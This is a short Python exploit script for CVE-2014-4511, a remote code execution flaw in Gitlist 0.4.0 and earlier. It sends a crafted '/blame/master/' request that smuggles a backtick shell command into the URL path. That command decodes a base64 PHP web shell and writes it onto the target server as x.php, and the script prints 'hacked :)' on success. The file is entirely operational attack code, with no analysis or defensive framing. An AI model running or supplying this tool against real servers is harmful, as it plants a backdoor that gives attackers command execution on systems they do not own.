import argparse
import requests
import base64
import urllib.parse
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2014-4511
# Gitlist <= 0.4.0 RCE
class CVE2014_4511:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, cache):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url, self.path = url.rstrip("/"), cache
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        shell = "<?system($_GET['cmd']);?>"
        payload = base64.b64encode(shell.encode()).decode()
        path = '/blame/master/""`echo {}|base64 -d > {}/x.php`'.format(payload, self.path)
        url = self.url + urllib.parse.quote(path, safe='')
        r = self.session.get(url, verify = False)
        if r.status_code == 500:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)
            sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-p','--path', required = True, help = "cache location")
    args = vars(parser.parse_args())
    url, path = args['url'], args['path']
    cve = CVE2014_4511(url, path)
    cve.exploit()

